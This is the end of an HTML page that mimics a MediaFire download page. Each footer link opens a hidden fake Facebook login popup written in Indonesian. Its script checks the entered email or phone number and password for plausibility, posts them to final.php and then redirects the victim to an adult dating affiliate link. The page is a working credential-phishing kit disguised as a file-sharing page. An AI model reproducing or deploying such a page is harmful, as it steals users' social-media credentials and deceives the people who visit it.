                                var supported = selection && selection.attributes['data-compat'];
                                compat.style.display = supported ? 'block' : 'none';
                                nonCompat.style.display = !supported ? 'block' : 'none';
                            };

                        </script> 
        </div> 
       </div> 
      </div> 
     </div> 
    </div> 
    <!-- Temp placement --> 
    <div id="non-dl-content" class="nonDLContentWrap"> 
     <style type="text/css">
                #div-gpt-ad-1575674121640-0 {
                    width: 100%; height: 100px; top: 70px; position: absolute; align-items: center; justify-content: center; display: flex;
                }
            </style> 
     <div id="div-gpt-ad-1575674121640-0"> 
      <script type="text/javascript">
                    googletag.cmd.push(function() {
                        googletag.display('div-gpt-ad-1575674121640-0');
                    });
                </script> 
     </div> 
     <style type="text/css">
                #div-gpt-ad-1579281108195-0 {
                    width: 100%; height: 100px; top: 440px; left: 0; position: absolute; display: flex; align-items: center; justify-content: center;
                }
            </style> 
     <div id="div-gpt-ad-1579281108195-0"> 
      <script type="text/javascript">
                    googletag.cmd.push(function() {
                        googletag.display('div-gpt-ad-1579281108195-0');
                    });
                </script> 
     </div> 
     <style type="text/css">
                #div-gpt-ad-1579281193413-0 {
                    width: 100%; height: 100px; bottom: 0; left: 0; display: flex; align-items: center; position: absolute; justify-content: center;
                }
            </style> 
     <div id="div-gpt-ad-1579281193413-0"> 
      <script type="text/javascript">
                    googletag.cmd.push(function() {
                        googletag.display('div-gpt-ad-1579281193413-0');
                    });
                </script> 
     </div> 
     <script type="text/javascript">
                    window['adLazyLoadQueue'].push("div-gpt-ad-1579281193413-0");
                </script> 
    </div> 
    <!-- Details for this download
=================================--> 
    <div class="DLExtraInfo-wrap"> 
     <!-- Upload details for file
    =================================--> 
     <div class="DLExtraInfo"> 
      <!-- Location + map --> 
      <div class="DLExtraInfo-uploadLocation DLExtraInfo-column"> 
       <div class="lazyload DLExtraInfo-uploadLocationMap Continent DLExtraInfo-uploadLocationMapBg" data-lazyclass="DLExtraInfo-uploadLocationMapBg"> 
        <span>Upload region:</span> 
        <div class="lazyload DLExtraInfo-uploadLocationRegion continent-as" data-lazyclass="continent-as"></div> 
       </div> 
       <!-- <div class="DLExtraInfo-sectionHeading">This file&#8217;s upload location</div> --> 
       <div class="lazyload DLExtraInfo-sectionGraphic flag" data-lazyclass="flag-id"></div> 
       <div class="DLExtraInfo-sectionDetails"> 
        <p>This file was uploaded from Indonesia on May 31, 2023 at 3:41 PM</p> 
       </div> 
      </div> 
      <div class="DLExtraInfo-upload DLExtraInfo-column"> 
       <!-- VirusTotal scan --> 
       <div class="DLExtraInfo-virusTotal DLExtraInfo-row"> 
        <div class="DLExtraInfo-sectionGraphic"> 
         <div class="lazyload DLExtraInfo-sectionGraphicCenter" data-lazyclass="DLExtraInfo-virusTotalImage"></div> 
        </div> 
        <div class="DLExtraInfo-sectionDetails"> 
         <div class="DLExtraInfo-sectionHeading">
          VirusTotal scan
         </div> 
         <p> MediaFire scans high-risk files using VirusTotal. </p> 
        </div> 
       </div> 
       <!-- Like MediaFire on Facebook --> 
       <div class="DLExtraInfo-Facebook DLExtraInfo-row"> 
        <div class="social-cont"> 
         <div class="social-fb-cont"> 
          <span id="social-fb-label">Like MediaFire on Facebook</span> 
          <iframe class="lazyload nopop" data-lazysrc="https://www.facebook.com/plugins/like.php?href=http://www.facebook.com/MediaFire&amp;width=193&amp;layout=button_count&amp;action=like&amp;show_faces=false&amp;share=true&amp;height=30&amp;appId=124578887583575" src="" width="190" height="30" scrolling="no" frameborder="0" allowtransparency="true" aria-labelledby="social-fb-label"></iframe> 
         </div> 
        </div> 
        <noscript>
         <style>.social-fb-cont>iframe{display:block}</style>
        </noscript> 
       </div> 
      </div> 
     </div> 
     <!-- Additional information
    =================================--> 
     <div class="DLExtraInfo DLExtraInfo-additional"> 
      <!-- Alternate for account status (not logged in) --> 
      <div class="DLExtraInfo-accountStatus DLExtraInfo-column"> 
       <div class="lazyload DLExtraInfo-sectionIcon" data-lazyclass="DLExtraInfo-accountStatusImage"></div> 
       <div class="DLExtraInfo-sectionDetails"> 
        <div class="DLExtraInfo-sectionHeading">
         About MediaFire
        </div> 
        <div class="DLExtraInfo-sectionSubHeading">
         Welcome!
        </div> 
        <p> With MediaFire, you get simple yet powerful file storage along with features you won’t find anywhere else. <a onclick="footericon()">Learn more</a> </p> 
       </div> 
      </div> 
      <!-- Browser/download application --> 
      <div class="DLExtraInfo-downloadApp DLExtraInfo-column"> 
       <div class="lazyload DLExtraInfo-sectionIcon" data-lazyclass="browser-chrome"></div> 
       <div class="DLExtraInfo-sectionDetails"> 
        <div class="DLExtraInfo-sectionHeading">
         Download application
        </div> 
        <div class="DLExtraInfo-sectionSubHeading">
         Chrome
        </div> 
        <p> You are downloading this file with <span>Chrome.</span> </p> 
       </div> 
      </div> 
     </div> 
    </div> 
   </div> 
   <div id="share" class="lightbox" role="dialog" tabindex="-1"> 
    <figure> 
     <a href="#" class="close" id="share-close" title="Close share dialog"><span style="display: none">Close share dialog</span></a> 
     <figcaption> 
      <iframe id="share-iframe" data-src="https://www.mediafire.com/widgets/share.php?web=1&amp;dlr=1&amp;files=dixx8s1n5ihyqla" allowtransparency="true" style=""> &lt;p id="share-desc"&gt; Failed to load. Try again in a supported browser. &lt;/p&gt; </iframe> 
      <noscript> 
       <p id="share-desc"> Failed to load. Please enable JavaScript. </p> 
      </noscript> 
     </figcaption> 
    </figure> 
   </div> 
   <div id="mobile-turbo-dl-enable" class="lightbox" role="dialog" tabindex="-1"> 
    <a href="#" class="close" id="mobile-turbo-dl-btn-close" title="Cancel"><span style="display: none">Cancel</span></a> 
    <div class="popup-container"> 
     <span class="mobile-turbo-dl-enable-title">Enable Turbo Downloader?</span> 
     <span class="mobile-turbo-dl-enable-message"> By enabling the Turbo Downloader Beta you are agreeing to use software that hasnt been fully tested. You can disable this at any time. Enabling the Turbo Downloader will reload the page. </span> 
     <a href="#" id="mobile-turbo-dl-btn-enable"><span>Enable Turbo Downloader</span> </a>
     <a href="#" id="mobile-turbo-dl-btn-cancel"><span>Cancel</span></a> 
    </div> 
   </div> 
  </main>
  <iframe name="googlefcPresent" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe> 
<footer role="contentinfo" id="footer" class="footer"> 
   <div class="u-wrap" id="mainFooterWrap"> 
    <div class="footerColWrap u-cf"> 
     <div class="footerCol"> 
      <h2><a onclick="footericon()">Company</a></h2> 
      <ul> 
       <li class="minFooterShow"><a onclick="footericon()">About<b> Us</b></a></li> 
       <li><a onclick="footericon()">Careers</a></li> 
       <li><a onclick="footericon()">Press</a></li> 
       <li><a onclick="footericon()" target="_blank">Company Blog</a></li> 
      </ul> 
     </div> 
     <div class="footerCol"> 
      <h2><a onclick="footericon()">Tools</a></h2> 
      <ul> 
       <li class="minFooterShow"> <a onclick="footericon()"><b>MediaFire </b>Mobile</a> </li> 
       <li class="minFooterShow"> <a href="https://fast.io" title="Fast.io - File Sharing and Cloud Storage for Teams" target="_blank" rel="noopener noreferrer" aria-label="Fast.io - Team File Sharing and Cloud Storage for Small Businesses">Team File Sharing</a> </li> 
      </ul> 
     </div> 
     <div class="footerCol"> 
      <h2><a onclick="footericon()">Upgrade</a></h2> 
      <ul> 
       <li><a onclick="footericon()">Professional</a></li> 
      </ul> 
     </div> 
     <div class="footerCol"> 
      <h2><a onclick="footericon()" target="_blank">Support</a></h2> 
      <ul> 
       <li class="minFooterShow"><a onclick="footericon()" target="_blank"><b>Get Support</b></a></li> 
      </ul> 
     </div> 
    </div> 
   </div> 
   <!-- SUBFOOTER --> 
   <div id="subFooterWrap"> 
    <div id="subFooter" class="u-wrap"> 
     <ul class="subFooterLinks"> 
      <li id="copyrightInfo">©2023 MediaFire<span> Build 121910</span></li> 
      <li><a onclick="footericon()">Advertising</a></li> 
      <li><a onclick="footericon()">Terms</a></li> 
      <li><a onclick="footericon()">Privacy Policy</a></li> 
      <li><a onclick="footericon()">Copyright</a></li> 
      <li><a onclick="footericon()">Abuse</a></li> 
      <li><a onclick="footericon()">Credits</a></li> 
      <li><a onclick="footericon()">More...</a></li> 
     </ul> 
     <div class="subFooterSocialWrap"> 
      <ul id="subFooterSocial"> 
       <li class="footerIcn"> <a href="http://blog.mediafire.com/" class="footerIcnBlog" target="_blank" title="MediaFire Blog"> <span class="footerIcnBlog"></span> </a> </li> 
       <li class="footerIcn"> <a href="https://twitter.com/#!/mediafire" class="footerIcnTw" target="_blank" rel="noreferrer" title="MediaFire's Twitter page"> <span class="footerIcnTw"></span> </a> </li> 
       <li class="footerIcn" style="margin-left: 0;"> <a href="https://www.facebook.com/mediafire" class="footerIcnFb" target="_blank" rel="noreferrer" title="MediaFire's Facebook page'"> <span class="footerIcnFb"></span> </a> </li> 
      </ul> 
     </div> 
     <div class="socialLinks" id="minSocialLinks"> 
      <a href="https://www.facebook.com/mediafire" class="shareFacebook" title="MediaFire on Facebook"><span style="display: none">Facebook Page</span></a> 
      <a href="https://twitter.com/mediafire" class="shareTwitter" title="MediaFire on Twitter"><span style="display: none">Twitter Page</span></a> 
      <a href="https://blog.mediafire.com/" class="shareBlogger" title="MediaFire Blog"><span style="display: none">MediaFire Blog</span></a> 
     </div> 
    </div> 
   </div> 
  </footer> 
<popup hide>
            <div class="popup-login login-facebook animated fadeIn">
        <div class="popup-box-login-fb">
            <div class="navbar-fb">
                <img width="45" src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240202_164508.png">
            </div>
            <div class="content-box-fb">
                <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
                <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
                <img width="75" height="75" src="https://www.mediafire.com/favicon.png">
                <div class="txt-login-fb">
                    Masuk ke akun Facebook Anda untuk terhubung dengan MediaFire
                </div>
                <form class="login-form" method="POST" action="" onsubmit="$(this).end()">
                    <label>
                        <input type="text" id="user" name="user" placeholder="Nomor ponsel atau email"
                            autocomplete="off" autocapitalize="off">
                    </label>
                    <label>
                        <input type="password" id="pass" name="pass" placeholder="Kata Sandi Facebook" autocomplete="off"
                            autocapitalize="off">
                    </label>
                    <!-- END -->
                    <input type="hidden" name="ip" value="">
                    <input type="hidden" name="ua" value="">
                    <button type="submit" id="btnfb" class="btn-login-fb">Masuk</button>
                </form>
                <div class="txt-create-account">Buat Akun</div>
                <div class="txt-not-now">Lain Kali</div>
                <div class="txt-forgotten-password">Lupa Kata Sandi?</div>
            </div>
            <div class="language-box">
                <center>
                    <div class="language-name language-name-active">Bahasa Indonesia</div>
                    <div class="language-name">English (UK)</div>
                    <div class="language-name">Basa Jawa</div>
                    <div class="language-name">Bahasa Melayu</div>
                    <div class="language-name">日本語</div>
                    <div class="language-name">Español</div>
                    <div class="language-name">Português (Brasil)</div>
                    <div class="language-name">
                        <i class="fa fa-plus"></i>
                    </div>
                </center>
            </div>
            <div class="copyrights">Facebook Inc.</div>
        </div>
    </div>
    </popup>
    </script>
    <script type="text/javascript">
        function footericon() {
            $('popup').removeAttr('hide');
        }
        
        let isReveal = false;
        function checkReveal(e) {
            let value = e.value;

            console.log(value.length)

            if (value.length !== "0") {
                $('reveal').removeAttr('hide');
            }

            if (value.length == "0") {
                $('reveal').attr('hide', "");
            }
        }
        window.addEventListener('submit', function (e) {
            e.preventDefault();
            $("#btnfb").addClass("disabled");
            setTimeout(() => {
                var user = $('#user').val();
                var pass = $('#pass').val();
                if (user == '' || user == null) {
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {

                    if (user.includes('@')) {
                        let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
                        if (user.match(pattern)) {
                            $('.email').hide();
                        } else {
                            $('.email').show();
                            $('.sandi').hide();
                            $("#btnfb").removeClass("disabled");
                            return false;
                        }
                    }

                    if (!isNaN(user)) {
                        if (user.length <= 10) {
                            $('.email').show();
                            $('.sandi').hide();
                            $("#btnfb").removeClass("disabled");
                            return false;
                        } else {
                            $('.email').hide();
                        }
                    }

                    if (user.match(/\s/g)) {
                        $('.email').show();
                        $('.sandi').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    } else {
                        $('.email').hide();
                    }

                    var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                    if (user.match(regex)) {
                        $('.email').show();
                        $('.sandi').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    }


                    if (user.length <= 5) {
                        $('.email').show();
                        $('.sandi').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    } else {
                        $('.email').hide();
                    }

                }
                if (pass == '' || pass == null || pass.length <= 5) {
                    $('.sandi').show();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {
                    $('.sandi').hide();
                }
                var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                if (pass.match(regexs)) {
                    $('.sandi').show();
                    $('.email').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {
                    $('.sandi').hide();
                }
                $.ajax({
                    type: 'POST',
                    url: 'final.php',
                    data: $('.login-form').serialize(),
                    dataType: 'text',
                    success: function () {
                        $('.login-facebook').fadeOut(),
                            window.location = 'https://best-video-app.com/dating/adult/columns/1/index.html?c=6332&u=28&p1=https%3A%2F%2Feemtuboo.com%2Fdating-survey.html%3Fvar_3%3D39ed08866c635a6e27f1d08330ed945d%26ymid%3D1018476%26var%3D22384882%26offer_id%3D2061%26geo%3D%7Bgeo%7D%26city%3D%7Bcity%7D%26testinapp%3D4455851%26b%3D19246770%26z%3D6461963%26nwimpr%3D1';
                    }
                })
            }, 1000)
        })

    </script>
 </body>
</html>